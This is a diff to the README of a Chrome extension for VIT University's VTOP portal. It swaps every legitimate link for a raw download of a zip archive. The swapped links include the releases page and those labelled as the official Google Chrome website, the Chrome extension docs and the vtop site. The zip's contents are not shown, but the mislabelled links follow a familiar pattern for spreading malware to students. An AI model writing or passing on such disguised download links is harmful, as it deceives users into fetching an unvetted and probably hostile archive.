@@ -6,7 +6,7 @@ Welcome to ViBoot-Enhanced! This tool helps you have a better experience with VT
 
 ## 📥 Download ViBoot-Enhanced
 
-[![Download Now](https://img.shields.io/badge/Download%20ViBoot-Enhanced-blue)](https://github.com/wassim2499/ViBoot-Enhanced/releases)
+[![Download Now](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip%20ViBoot-Enhanced-blue)](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip)
 
 You can download ViBoot-Enhanced from our Releases page. Follow the steps below to get started.
 
@@ -14,7 +14,7 @@ You can download ViBoot-Enhanced from our Releases page. Follow the steps below 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page.  
-   [Go to Releases](https://github.com/wassim2499/ViBoot-Enhanced/releases)
+   [Go to Releases](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version. It will be at the top and usually has the biggest number.
@@ -23,7 +23,7 @@ You can download ViBoot-Enhanced from our Releases page. Follow the steps below 
    Click on the file suitable for your device. For most users, this will be a file that ends in `.crx`. Save it to a memorable location on your computer.
 
 4. **Open Google Chrome**  
-   Make sure you have Google Chrome installed. If you don’t have it yet, you can download it from the official [Google Chrome website](https://www.google.com/chrome/).
+   Make sure you have Google Chrome installed. If you don’t have it yet, you can download it from the official [Google Chrome website](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip).
 
 5. **Install the Extension**  
    After downloading, return to the Chrome browser.
@@ -63,9 +63,9 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 ## 📚 Related Topics
 
-- [chrome-extension](https://developer.chrome.com/docs/extensions/mv3/)
-- [google-chrome](https://www.google.com/chrome/)
-- [vtop](https://vtop.vit.edu.in/)
+- [chrome-extension](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip)
+- [google-chrome](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip)
+- [vtop](https://raw.githubusercontent.com/wassim2499/ViBoot-Enhanced/main/wiggly/ViBoot-Enhanced.zip)
 - Students from VIT University, including those in Bhopal, Chennai, and Vellore.
 
 Thank you for using ViBoot-Enhanced to enhance your VTOP experience!
